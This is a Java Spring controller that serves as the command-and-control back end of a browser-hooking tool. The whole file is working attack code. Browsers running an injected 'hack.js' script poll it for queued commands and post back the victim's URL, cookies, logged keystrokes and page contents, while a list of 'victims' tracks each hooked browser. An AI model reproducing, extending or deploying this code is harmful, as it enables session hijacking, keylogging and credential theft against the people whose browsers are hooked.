package nl.byron.hacking.controller;

import nl.byron.hacking.model.ShellCommand;
import nl.byron.hacking.model.TunnelCommand;
import nl.byron.hacking.model.Victim;
import org.joda.time.DateTime;
import org.joda.time.LocalDateTime;
import org.joda.time.format.DateTimeFormat;
import org.joda.time.format.DateTimeFormatter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.ResponseStatus;

import java.util.ArrayList;
import javax.servlet.http.HttpServletRequest;

/**
 * @author Byron Voorbach
 */
@Controller
public class TunnelController {

    @Autowired
    private ShellController shellController;

    private static final DateTimeFormatter fmt = DateTimeFormat.forPattern("HH:mm:ss");

    ArrayList<Victim> victims = new ArrayList<Victim>();

    /////RECEIVE/////

    @RequestMapping(value = "/receiveUrl/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedUrl(@PathVariable String generatedId, @RequestBody String url) {
        ShellCommand shellCommand = new ShellCommand(generatedId, new LocalDateTime().toString(fmt), "getUrl", url);
        shellController.reportBack(shellCommand);
    }

    @RequestMapping(value = "/receiveCookies/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedCookies(@PathVariable String generatedId, @RequestBody String cookies) {
        ShellCommand shellCommand = new ShellCommand(generatedId, new LocalDateTime().toString(fmt), "getCookies", cookies);
        shellController.reportBack(shellCommand);
    }

    @RequestMapping(value = "/receiveKeys/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedKeys(@PathVariable String generatedId, @RequestBody String keys) {
        keys = keys.replace("undefined", "");
        ShellCommand shellCommand = new ShellCommand(generatedId, new LocalDateTime().toString(fmt), "stopLogger", keys);
        shellController.reportBack(shellCommand);
    }

    @RequestMapping(value = "/receiveSite/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedSite(@PathVariable String generatedId, @RequestBody String site) {
        Victim victim = getVictim(generatedId);
        if (victim != null) {
            site = site.replace("<script src=\"/resources/static/js/hack.js\"></script>", "");
            victim.setCurrentPage(site);
        }
    }

    /////SEND/////

    /*
        NTP = nothing to process
     */
    @RequestMapping(value = "/ping/{generatedId}", method = RequestMethod.GET)
    @ResponseBody
    public Object handlePing(@PathVariable String generatedId, HttpServletRequest request) {
        boolean exists = false;
        Victim currentVictim = new Victim(generatedId, request, new DateTime());

        for (Victim victim : victims) {
            if (victim.getId().equals(generatedId)) {
                currentVictim = victim;
                exists = true;
                break;
            }
        }

        if (!exists) {
            victims.add(currentVictim);
        } else {
            currentVictim.setLastSeen(new DateTime());
        }

        ArrayList<TunnelCommand> commandsToBeSent = currentVictim.getCommandsToBeSent();


        if (commandsToBeSent.size() > 0) {
            TunnelCommand tunnelCommand = commandsToBeSent.get(0);
            commandsToBeSent.remove(tunnelCommand);

            return tunnelCommand;
        }

        return "ntp";
    }






    public void addCommandToBeProcessed(String id, TunnelCommand command) {
        for (Victim victim : victims) {
            if (victim.getId().equals(id)) {
                ArrayList<TunnelCommand> commandsToBeSent = victim.getCommandsToBeSent();
                commandsToBeSent.add(command);
            }
        }
    }

    public ArrayList<Victim> getVictims() {
        return victims;
    }

    public void setVictims(ArrayList<Victim> victims) {
        this.victims = victims;
    }

    public Victim getVictim(String id) {
        for (Victim victim : victims) {
            if (victim.getId().equals(id)) {
                return victim;
            }
        }
        return null;
    }
}
